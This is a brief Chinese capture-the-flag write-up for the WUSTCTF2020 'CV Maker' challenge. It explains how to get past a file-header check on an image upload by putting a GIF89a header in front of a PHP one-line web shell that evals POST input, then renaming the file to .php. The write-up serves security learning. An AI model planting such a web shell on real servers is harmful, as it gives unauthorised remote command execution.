# [WUSTCTF2020]CV Maker 文件头检查

这道很简单

首先注册登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/61bc428db7d86d0cea7c594b23eadadf.png" alt="" style="max-height:336px; box-sizing:content-box;" />


很显然是我们文件上传

我们直接随便上传一个看看



<img src="https://i-blog.csdnimg.cn/blog_migrate/fb55c7373b447050951c7a19007c0d4c.png" alt="" style="max-height:266px; box-sizing:content-box;" />


报错了我们去看看 这个exif是什么



<img src="https://i-blog.csdnimg.cn/blog_migrate/8ee2b6ba0d2befa81dd97d9fa03d3f1e.png" alt="" style="max-height:235px; box-sizing:content-box;" />


就是检查文件头 那我们直接修改文件头上传即可

```cobol
GIF89a
<script language="php">
    @eval($_POST['cmd']);
</script>
```

上传修改php即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/23d613b8101e27b4fc63c9e9d64b46f9.png" alt="" style="max-height:92px; box-sizing:content-box;" />